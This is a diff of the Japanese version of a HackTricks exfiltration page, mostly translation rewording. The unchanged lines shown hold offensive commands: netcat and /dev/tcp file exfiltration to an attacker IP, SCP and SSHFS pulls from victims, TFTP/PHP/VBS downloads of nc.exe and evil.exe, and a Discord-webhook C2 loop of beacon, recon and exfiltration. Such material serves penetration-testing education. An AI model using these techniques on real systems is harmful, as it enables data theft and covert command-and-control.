@@ -2,11 +2,18 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## 情報をexfiltrateするために一般的にホワイトリスト化されているドメイン
+> [!TIP]
+> エンドツーエンドの例として、`C:\Users\Public` に loot をステージし、Rclone を使って正規のバックアップを模倣して exfiltrating するワークフローは以下を確認してください。
 
-悪用可能な一般的にホワイトリスト化されているドメインを見つけるには [https://lots-project.com/](https://lots-project.com/) を確認してください
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
 
-## Copy\&Paste Base64
+## 情報を exfiltrate するために一般的にホワイトリスト登録されるドメイン
+
+悪用可能な一般的にホワイトリスト登録されるドメインを見つけるには [https://lots-project.com/](https://lots-project.com/) を確認してください
+
+## コピー\&ペースト Base64
 
 **Linux**
 ```bash
@@ -59,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Server**
+### **HTTPS サーバー**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -100,14 +107,14 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) を C2 と Data Exfiltration に利用
+## Webhooks (Discord/Slack/Teams) を使った C2 & Data Exfiltration
 
-Webhooks は、JSON と任意の file parts を受け取る書き込み専用の HTTPS エンドポイントです。一般に信頼された SaaS ドメインで許可され、OAuth/API keys を必要としないため、低摩擦の beaconing と exfiltration に便利です。
+WebhooksはJSONと任意のファイルパートを受け付ける書き込み専用のHTTPSエンドポイントです。信頼されたSaaSドメインで許可されることが多く、OAuth/APIキーを必要としないため、低摩擦のbeaconingやexfiltrationに便利です。
 
 Key ideas:
-- エンドポイント: Discord は https://discord.com/api/webhooks/<id>/<token> を使用
-- POST multipart/form-data で、payload_json というパートに {"content":"..."} を含め、任意の file パート（name は file）を添付
-- オペレータループパターン: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK が配信を確認
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,8 +185,8 @@ Start-Sleep -Seconds 20
 }
 ```
 注意:
-- 同様のパターンは、incoming webhooks を使用する他のコラボレーションプラットフォーム（Slack/Teams）にも当てはまります。URL と JSON schema を適宜調整してください。
-- Discord Desktop のキャッシュアーティファクトの DFIR と webhook/API の復元については、次を参照してください：
+- 同様のパターンは、incoming webhooks を使用する他のコラボレーションプラットフォーム（Slack/Teams）にも当てはまります。URL と JSON schema をそれに応じて調整してください。
+- Discord Desktop の cache artifacts に関する DFIR と webhook/API の復旧については、次を参照してください:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -192,12 +199,12 @@ Start-Sleep -Seconds 20
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTPサーバー (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP サーバ (pure-ftp)
+### FTPサーバ (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -228,7 +235,7 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kaliをサーバーとして
+Kali をサーバーとして
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
@@ -260,13 +267,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-The attackerはSSHdを実行している必要がある。
+攻撃者はSSHdが稼働している必要がある。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-victimがSSHを使える場合、attackerはvictimのディレクトリをattacker側にマウントできます。
+被害者が SSH を利用できる場合、攻撃者は被害者のディレクトリを攻撃者側にマウントできます。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -284,7 +291,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 被害者にファイルをアップロードする
+### 被害者へファイルをアップロード
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -313,33 +320,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-SMTPサーバーにデータを送信できる場合、pythonでデータを受信するSMTPサーバを作成できます:
+SMTPサーバーにデータを送信できる場合、pythonでデータを受信するためのSMTPサーバーを作成できます:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-XP と 2003 ではデフォルトで有効です（その他の環境ではインストール時に明示的に追加する必要があります）
+既定では XP と 2003 に含まれています（その他ではインストール時に明示的に追加する必要があります）
 
-Kali では、**TFTP サーバーを起動する**:
+Kaliでは、**start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTPサーバー (pythonで):**
+**pythonでのTFTPサーバー:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**victim** で Kali サーバーに接続する:
+**victim** で Kali サーバーに接続します:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP onelinerを使ってファイルをダウンロード:
+PHP のワンライナーでファイルをダウンロードする:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -381,15 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` プログラムは、binaries の解析だけでなく、**hex から再構築する機能**も備えています。つまり、binary の hex を与えることで、`debug.exe` はその binary ファイルを生成できます。
-
-ただし、debug.exe は **64 kb までのファイルしかアセンブルできない制限**があることに注意してください。
+`debug.exe` プログラムはバイナリの解析だけでなく、**hex からそれらを再構築する機能**も備えています。つまり、バイナリの hex を与えることで、`debug.exe` はそのバイナリファイルを生成できます。ただし、debug.exe には **ファイルを最大 64 kb までアセンブルする制限** がある点に注意してください。
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-その後、テキストを windows-shell にコピー＆ペーストすると、nc.exe というファイルが作成されます。
+そのテキストを windows-shell にコピー＆ペーストすると、nc.exe というファイルが作成されます。
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -397,7 +402,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
-## References
+## 参考資料
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
